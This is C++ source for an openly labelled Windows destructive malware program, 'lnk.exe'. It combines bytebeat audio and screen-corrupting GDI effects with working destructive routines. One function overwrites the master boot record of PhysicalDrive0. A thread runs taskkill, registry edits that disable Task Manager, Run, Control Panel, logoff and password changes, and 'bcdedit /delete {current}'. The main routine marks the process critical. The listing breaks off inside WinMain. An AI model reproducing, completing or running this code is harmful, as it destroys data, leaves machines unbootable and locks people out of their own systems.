﻿#define _USE_MATH_DEFINES
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <windowsx.h>
#include <mmsystem.h>
#include <wingdi.h>
#include <winuser.h>
#include <commctrl.h>
#include <shellapi.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <dwmapi.h>
#include <uxtheme.h>
#include <tchar.h>
#include <intrin.h>

#include <cmath>
#include <math.h>
#include <cstdlib>
#include <stdlib.h>
#include <cstdio>
#include <stdio.h>
#include <ctime>
#include <time.h>
#include <cstring>
#include <string.h>
#include <cstdint>
#include <stdint.h>
#include <cfloat>
#include <float.h>
#include <climits>
#include <limits.h>
#include <cassert>
#include <random>
#include <chrono>
#include <thread>
#include <mutex>
#include <atomic>
#include <vector>
#include <array>
#include <string>
#include <algorithm>
#include <numeric>
#include <functional>
#include <complex>
#include <tuple>
#include <utility>
#include <memory>
#include <iostream>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "dwmapi.lib")
#pragma comment(lib, "uxtheme.lib")
#pragma comment(lib, "psapi.lib")
typedef LONG(__stdcall* NRHEdef)(LONG, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
typedef LONG(__stdcall* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef LONG(__stdcall* RSPICdef)(BOOLEAN, PBOOLEAN, BOOLEAN);
void Sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	const int bufferSize = 8000 * 30;
	char* buffer = new char[bufferSize];

	for (DWORD t = 0; t < bufferSize; ++t) {
		buffer[t] = static_cast<char>((t >> (t >> 12) % 4) + t * (1 + (1 + (t >> 16) % 6) * (t >> 10) * (t >> 11) % 8) ^ t >> 13 ^ t >> 6);
	}

	WAVEHDR header = { buffer, bufferSize, 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

	while (!(header.dwFlags & WHDR_DONE)) {
		Sleep(10);
	}

	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
	delete[] buffer;
}
void Sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	const int bufferSize = 8000 * 30;
	char* buffer = new char[bufferSize];

	for (DWORD t = 0; t < bufferSize; ++t) {
		buffer[t] = static_cast<char>(9 * t & t >> 4 | 5 * t & t >> 7 | (3 * t & t >> 10) - 1);
	}

	WAVEHDR header = { buffer, bufferSize, 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

	while (!(header.dwFlags & WHDR_DONE)) {
		Sleep(10);
	}

	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
	delete[] buffer;
}
void Sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	const int bufferSize = 8000 * 30;
	char* buffer = new char[bufferSize];

	for (DWORD t = 0; t < bufferSize; ++t) {
		buffer[t] = static_cast<char>((t * t / (1 + (t >> 9 & t >> 8)) & 128));
	}

	WAVEHDR header = { buffer, bufferSize, 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

	while (!(header.dwFlags & WHDR_DONE)) {
		Sleep(10);
	}

	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
	delete[] buffer;
}
void Sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	const int bufferSize = 8000 * 30;
	char* buffer = new char[bufferSize];

	for (DWORD t = 0; t < bufferSize; ++t) {
		buffer[t] = static_cast<char>((((t >> 9) - 1 ^ (t >> 9) ^ 1) % 13) * t * t);
	}

	WAVEHDR header = { buffer, bufferSize, 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

	while (!(header.dwFlags & WHDR_DONE)) {
		Sleep(10);
	}

	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
	delete[] buffer;
}
void Sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	const int bufferSize = 8000 * 30;
	char* buffer = new char[bufferSize];

	for (DWORD t = 0; t < bufferSize; ++t) {
		buffer[t] = static_cast<char>((t * ((t & 4096 ? t % 65536 < 59392 ? 7 : t >> 6 : 16) + (1 & t >> 14)) >> (3 & -(int)t >> (t & 2048 ? 2 : 10))) * t & t >> 5);
	}

	WAVEHDR header = { buffer, bufferSize, 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

	while (!(header.dwFlags & WHDR_DONE)) {
		Sleep(10);
	}

	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
	delete[] buffer;
}
void Sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	const int bufferSize = 8000 * 30;
	char* buffer = new char[bufferSize];

	for (DWORD t = 0; t < bufferSize; ++t) {
		buffer[t] = static_cast<char>((t >> (t & 7)) * (t >> 5));
	}

	WAVEHDR header = { buffer, bufferSize, 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

	while (!(header.dwFlags & WHDR_DONE)) {
		Sleep(10);
	}

	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
	delete[] buffer;
}
void Sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	const int bufferSize = 8000 * 30;
	char* buffer = new char[bufferSize];

	for (DWORD t = 0; t < bufferSize; ++t) {
		buffer[t] = static_cast<char>(((t * (((t >> 7) | (t >> 9)) & 0x1E)) & (t << 1)));
	}

	WAVEHDR header = { buffer, bufferSize, 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

	while (!(header.dwFlags & WHDR_DONE)) {
		Sleep(10);
	}

	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
	delete[] buffer;
}
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;

DWORD WINAPI Payload1(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		BitBlt(hdc, 0, -30, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, 0, h - 30, w, h, hdc, 0, 0, NOTSRCCOPY);
		BitBlt(hdc, -30, 0, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, w - 30, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
	return 0;
}

DWORD WINAPI rgb(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0);
	HDC hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0);
	INT h = GetSystemMetrics(1);

	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;

	PRGBQUAD rgbScreen = nullptr;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	HGDIOBJ oldObj = SelectObject(hdcMem, hbmTemp);
	ReleaseDC(NULL, hdcScreen);

	while (1) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

		for (INT i = 0; i < w * h; i++) {
			rgbScreen[i].rgb = (rgbScreen[i].rgb * 2) % (RGB(255, 255, 255));
		}

		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen);
		Sleep(10);
	}

	SelectObject(hdcMem, oldObj);
	DeleteObject(hbmTemp);
	DeleteDC(hdcMem);
	return 0;
}
DWORD WINAPI Payload2(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	HMODULE hMoricons = LoadLibraryW(L"moricons.dll");
	HICON icons[64];
	int iconCount = 0;
	if (hMoricons) {
		for (int i = 0; i < 64; i++) {
			HICON hIcon = ExtractIconW(hMoricons, L"moricons.dll", i);
			if (hIcon && hIcon != (HICON)1) {
				icons[iconCount++] = hIcon;
			}
		}
	}

	HRSRC hRes = FindResourceW(NULL, MAKEINTRESOURCEW(101), RT_RCDATA);
	HGLOBAL hData = hRes ? LoadResource(NULL, hRes) : NULL;
	DWORD resSize = hRes ? SizeofResource(NULL, hRes) : 0;
	const BYTE* resBytes = hData ? (const BYTE*)LockResource(hData) : nullptr;

	int colorHue = 0;
	float angle = 0.0f;

	while (1) {
		HDC hdc = GetDC(0);
		HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP hbm = CreateCompatibleBitmap(hdc, w, h);
		HGDIOBJ oldObj = SelectObject(hdcMem, hbm);

		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		StretchBlt(hdc, -15, -15, w + 30, h + 30, hdcMem, 0, 0, w, h, SRCCOPY);

		if (iconCount > 0) {
			DrawIcon(hdc, rand() % w, rand() % h, icons[rand() % iconCount]);
		}

		colorHue = (colorHue + 15) % 360;
		float rad = colorHue * 3.14159f / 180.0f;
		int r = (int)((sin(rad) + 1.0f) * 127.5f);
		int g = (int)((sin(rad + 2.094f) + 1.0f) * 127.5f);
		int b = (int)((sin(rad + 4.188f) + 1.0f) * 127.5f);

		HPEN hPen = CreatePen(PS_SOLID, 3, RGB(r, g, b));
		HGDIOBJ oldPen = SelectObject(hdc, hPen);

		if (resBytes && resSize >= 4) {
			int numPoints = resSize / 2;
			if (numPoints > 256) numPoints = 256;
			for (int i = 0; i < numPoints - 1; i++) {
				int x1 = (resBytes[i * 2] * w) / 255 + (int)(sin(angle + i * 0.2f) * 20.0f);
				int y1 = (resBytes[i * 2 + 1] * h) / 255 + (int)(cos(angle + i * 0.2f) * 20.0f);
				int x2 = (resBytes[(i + 1) * 2] * w) / 255 + (int)(sin(angle + (i + 1) * 0.2f) * 20.0f);
				int y2 = (resBytes[(i + 1) * 2 + 1] * h) / 255 + (int)(cos(angle + (i + 1) * 0.2f) * 20.0f);
				MoveToEx(hdc, x1, y1, NULL);
				LineTo(hdc, x2, y2);
			}
		}
		else {
			for (int i = 0; i < 12; i++) {
				int x1 = rand() % w + (int)(sin(angle + i) * 25.0f);
				int y1 = rand() % h + (int)(cos(angle + i) * 25.0f);
				int x2 = rand() % w + (int)(sin(angle + i + 1) * 25.0f);
				int y2 = rand() % h + (int)(cos(angle + i + 1) * 25.0f);
				MoveToEx(hdc, x1, y1, NULL);
				LineTo(hdc, x2, y2);
			}
		}

		angle += 0.25f;

		SelectObject(hdc, oldPen);
		DeleteObject(hPen);
		SelectObject(hdcMem, oldObj);
		DeleteObject(hbm);
		DeleteDC(hdcMem);
		ReleaseDC(0, hdc);
		Sleep(15);
	}

	for (int i = 0; i < iconCount; i++) {
		DestroyIcon(icons[i]);
	}
	if (hMoricons) {
		FreeLibrary(hMoricons);
	}
	return 0;
}
#include <objidl.h>
#include <gdiplus.h>
#pragma comment(lib, "gdiplus.lib")

Gdiplus::Bitmap* LoadPngFromResource(int resourceId) {
	HRSRC hRes = FindResourceW(NULL, MAKEINTRESOURCEW(resourceId), RT_RCDATA);
	if (!hRes) return nullptr;
	DWORD resSize = SizeofResource(NULL, hRes);
	if (!resSize) return nullptr;
	HGLOBAL hData = LoadResource(NULL, hRes);
	if (!hData) return nullptr;
	void* pData = LockResource(hData);
	if (!pData) return nullptr;

	HGLOBAL hBuffer = GlobalAlloc(GMEM_MOVEABLE, resSize);
	if (!hBuffer) return nullptr;
	void* pBuffer = GlobalLock(hBuffer);
	memcpy(pBuffer, pData, resSize);
	GlobalUnlock(hBuffer);

	IStream* pStream = nullptr;
	if (CreateStreamOnHGlobal(hBuffer, TRUE, &pStream) != S_OK) {
		GlobalFree(hBuffer);
		return nullptr;
	}

	Gdiplus::Bitmap* bmp = Gdiplus::Bitmap::FromStream(pStream);
	pStream->Release();
	return bmp;
}

DWORD WINAPI Payload3(LPVOID lpParam) {
	Gdiplus::GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	Gdiplus::Bitmap* rgbImg = LoadPngFromResource(102);

	int offset = 0;

	while (1) {
		HDC hdc = GetDC(0);
		BitBlt(hdc, 15, 10, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, -w + 15, 10, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, 15, -h + 10, w, h, hdc, 0, 0, SRCCOPY);

		if (rgbImg) {
			Gdiplus::Graphics graphics(hdc);
			offset = (offset + 25) % w;
			graphics.DrawImage(rgbImg, offset, 0, w, h);
			graphics.DrawImage(rgbImg, offset - w, 0, w, h);
		}

		ReleaseDC(0, hdc);
		Sleep(15);
	}

	if (rgbImg) delete rgbImg;
	Gdiplus::GdiplusShutdown(gdiplusToken);
	return 0;
}

DWORD WINAPI Ellipse(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	while (1) {
		HDC hdc = GetDC(0);
		HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
		HPEN hPen = CreatePen(PS_SOLID, 2, RGB(rand() % 256, rand() % 256, rand() % 256));
		HGDIOBJ oldBrush = SelectObject(hdc, hBrush);
		HGDIOBJ oldPen = SelectObject(hdc, hPen);

		int x = rand() % w;
		int y = rand() % h;
		int rw = 10 + (rand() % (w / 2));
		int rh = 10 + (rand() % (h / 2));

		Ellipse(hdc, x - rw, y - rh, x + rw, y + rh);

		SelectObject(hdc, oldBrush);
		SelectObject(hdc, oldPen);
		DeleteObject(hBrush);
		DeleteObject(hPen);
		ReleaseDC(0, hdc);
		Sleep(20);
	}
	return 0;
}
DWORD WINAPI Payload4(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdc, 1, 1, w, h, hdc, 0, 0, SRCINVERT);
		BitBlt(hdc, -1, -1, w, h, hdc, 0, 0, SRCINVERT);
		BitBlt(hdc, 1, -1, w, h, hdc, 0, 0, SRCINVERT);
		BitBlt(hdc, -1, 1, w, h, hdc, 0, 0, SRCINVERT);
		ReleaseDC(GetDesktopWindow(), hdc);
		DeleteDC(hdc);
		Sleep(10);
	}
	return 0;
}
DWORD WINAPI Payload5(LPVOID lpParam) {
	HDC hdc = 0;
	int sx = 0, sy = 0;

	while (1)
	{
		hdc = GetWindowDC(GetDesktopWindow());
		sx = GetSystemMetrics(SM_CXSCREEN);
		sy = GetSystemMetrics(SM_CYSCREEN);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 225, rand() % 225, rand() % 225));
		HGDIOBJ oldBrush = SelectObject(hdc, brush);
		PatBlt(hdc, 0, 0, sx, sy, PATINVERT);
		BitBlt(hdc, rand() % 5, rand() % 5, rand() % sx, rand() % sy, hdc, rand() % 5, rand() % 5, SRCCOPY);
		SelectObject(hdc, oldBrush);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
	return 0;
}
DWORD WINAPI Payload6(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	int hue = 0;

	while (true) {
		HDC hdc = GetDC(0);

		for (int i = 0; i < 15; i++) {
			int size = 30 + (rand() % 150);
			int x = rand() % w;
			int y = rand() % h;
			PatBlt(hdc, x, y, size, size, DSTINVERT);
		}

		hue = (hue + 12) % 360;
		float rad = hue * 3.14159f / 180.0f;
		int r = (int)((sin(rad) + 1.0f) * 127.5f);
		int g = (int)((sin(rad + 2.094f) + 1.0f) * 127.5f);
		int b = (int)((sin(rad + 4.188f) + 1.0f) * 127.5f);

		HBRUSH hBrush = CreateSolidBrush(RGB(r, g, b));
		HGDIOBJ oldBrush = SelectObject(hdc, hBrush);
		PatBlt(hdc, 0, 0, w, h, PATINVERT);

		SelectObject(hdc, oldBrush);
		DeleteObject(hBrush);
		ReleaseDC(0, hdc);
		Sleep(15);
	}
	return 0;
}
DWORD WINAPI Payload7(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	while (1) {
		hdc = GetDC(0);
		for (float i = 0; i < sw + sh; i += 0.99f) {
			int a = sin(angle) * 360;
			BitBlt(hdc, 0, i, sw, 1, hdc, a, i, SRCCOPY);
			angle += M_PI / 3;
			DeleteObject(&i);
			DeleteObject(&a);
		}
		ReleaseDC(wnd, hdc);
		DeleteDC(hdc);
		DeleteObject(&sw);
		DeleteObject(&sh);
		DeleteObject(&angle);
	}
	return 0;
}
DWORD WINAPI TextOut(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	int x = 100;
	int y = 100;
	int dx = 8;
	int dy = 8;
	int hue = 0;

	HFONT hFont = CreateFontW(64, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, ANTIALIASED_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Segoe UI");

	while (1) {
		HDC hdc = GetDC(0);
		HGDIOBJ oldFont = SelectObject(hdc, hFont);
		SetBkMode(hdc, TRANSPARENT);

		hue = (hue + 10) % 360;
		float rad = hue * 3.14159f / 180.0f;
		int r = (int)((sin(rad) + 1.0f) * 127.5f);
		int g = (int)((sin(rad + 2.094f) + 1.0f) * 127.5f);
		int b = (int)((sin(rad + 4.188f) + 1.0f) * 127.5f);
		SetTextColor(hdc, RGB(r, g, b));

		const wchar_t* text = L"lnk.exe";
		SIZE textSize;
		GetTextExtentPoint32W(hdc, text, 7, &textSize);

		::TextOutW(hdc, x, y, text, 7);

		x += dx;
		y += dy;

		if (x <= 0 || x + textSize.cx >= w) {
			dx = -dx;
			if (x < 0) x = 0;
			if (x + textSize.cx > w) x = w - textSize.cx;
		}
		if (y <= 0 || y + textSize.cy >= h) {
			dy = -dy;
			if (y < 0) y = 0;
			if (y + textSize.cy > h) y = h - textSize.cy;
		}

		SelectObject(hdc, oldFont);
		ReleaseDC(0, hdc);
		Sleep(15);
	}

	DeleteObject(hFont);
	return 0;
}
unsigned char mbr[512] = {
	0xFA, 0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E, 0xD0, 0xBC, 0x00, 0x7C,
	0xFB, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x31,
	0xED, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0x89, 0xF8, 0x31, 0xD2, 0xBB, 0x40,
	0x01, 0xF7, 0xF3, 0x01, 0xD0, 0x01, 0xE8, 0x24, 0x1F, 0x04, 0x20, 0xAA,
	0xE2, 0xEE, 0x45, 0xEB, 0xE6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};
DWORD WINAPI MBRWiper(LPVOID lpParam) {
	HANDLE hDrive = CreateFileW(
		L"\\\\.\\PhysicalDrive0",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_WRITE_THROUGH,
		NULL
	);

	if (hDrive == INVALID_HANDLE_VALUE) {
		return GetLastError();
	}

	DWORD bytesReturned = 0;

	SetFilePointer(hDrive, 0, NULL, FILE_BEGIN);

	DWORD bytesWritten = 0;
	BOOL success = WriteFile(
		hDrive,
		mbr,
		sizeof(mbr),
		&bytesWritten,
		NULL
	);

	DWORD result = (success && bytesWritten == sizeof(mbr)) ? 0 : GetLastError();

	return 0;
}
DWORD WINAPI Disabler(LPVOID lpParam) {
	system("taskkill /f /im taskmgr.exe");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
	system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
	system("bcdedit /delete {current}");
	return 1;
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	if (MessageBoxW(NULL, L"This is a malware, run?", L"lnk.exe", MB_YESNO | MB_ICONWARNING) != IDYES) {
		return 0;
	}
	if (MessageBoxW(NULL, L"Are you sure? This is a destroy you computer", L"lnk.exe", MB_YESNO | MB_ICONWARNING) != IDYES) {
		return 0;
	}
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (hNtdll) {
		BOOLEAN bl; RAPdef rPriv = (RAPdef)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
		RSPICdef fCrit = (RSPICdef)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
		if (rPriv != NULL && fCrit != NULL) { rPriv(20, TRUE, FALSE, &bl); fCrit(TRUE, NULL, FALSE); }
	}
	CreateThread(0, 0, MBRWiper, 0, 0, 0);
	CreateThread(0, 0, Disabler, 0, 0, 0);
	Sleep(5000);
	srand((unsigned int)time(NULL));

	HANDLE hP1 = CreateThread(NULL, 0, Payload1, NULL, 0, NULL);
	HANDLE hRgb = CreateThread(NULL, 0, rgb, NULL, 0, NULL);
	Sound1();
	TerminateThread(hP1, 0);
	CloseHandle(hP1);
	TerminateThread(hRgb, 0);
	CloseHandle(hRgb);

	HANDLE hP2 = CreateThread(NULL, 0, Payload2, NULL, 0, NULL);
	Sound2();
	TerminateThread(hP2, 0);
